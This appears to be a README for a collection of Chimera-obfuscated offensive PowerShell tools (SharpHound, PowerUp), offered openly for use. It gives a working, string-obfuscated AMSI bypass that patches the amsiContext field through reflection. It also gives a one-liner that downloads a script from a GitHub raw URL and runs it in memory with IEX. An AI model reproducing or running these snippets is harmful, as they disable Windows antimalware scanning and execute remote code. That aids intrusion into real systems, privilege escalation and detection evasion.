# A Collection of encoded powershell tools. All encoding done via Chimera

Tools added:
* SharpHound
* PowerUp

# How to

## Disable AMSI

``` pwsh
$String1 = @('s','l','i','t','U','i','*');$String2 = @('t','x','e','t','n','o','C','*');[array]::Reverse($String1);[array]::Reverse($String2);$Ass=[Ref].Assembly.GetTypes();Foreach($SingleAss in $Ass) {if($SingleAss.Name -Like (-join($String1))){$Wildcard=$SingleAss}};$WildcardFields=$Wildcard.GetFields('NonPublic, Static');Foreach($WildcardObjects in $WildcardFields) {if($WildcardObjects.Name -Like (-join($String2))){$ObjectContext=$WildcardObjects}};$NullValue=$ObjectContext.GetValue($null);[IntPtr]$ptr=$NullValue;[Int32[]]$SingleAssuf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($SingleAssuf, 0, $ptr, 1);
```

## Run PowerShell script in memory

``` pwsh
(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/OverflowMyBuffers/whatever-script.ps1') | IEX
```
